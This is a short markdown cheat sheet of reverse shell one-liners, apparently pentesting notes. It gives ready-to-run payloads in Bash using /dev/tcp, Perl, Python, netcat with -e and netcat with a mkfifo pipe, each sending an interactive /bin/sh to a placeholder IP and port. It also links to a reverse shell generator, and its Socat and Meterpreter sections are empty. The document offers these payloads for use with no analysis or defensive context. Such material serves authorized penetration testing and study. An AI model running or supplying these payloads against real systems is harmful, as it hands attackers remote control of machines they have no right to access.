# Shells 
## Bash
**In Current Shell**
```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```
**In New Bash Shell**
Linux
```bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
```
## Perl 
Linux
```bash
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## Python 
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## Netcat 
### With '-e' Option
```bash
nc -e /bin/sh IP PORT
```
### Without '-e' Option
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
```
## Socat 
## Meterpreter 
## Links
### Reverse Shell Generator
[RevShells](https://www.revshells.com/)
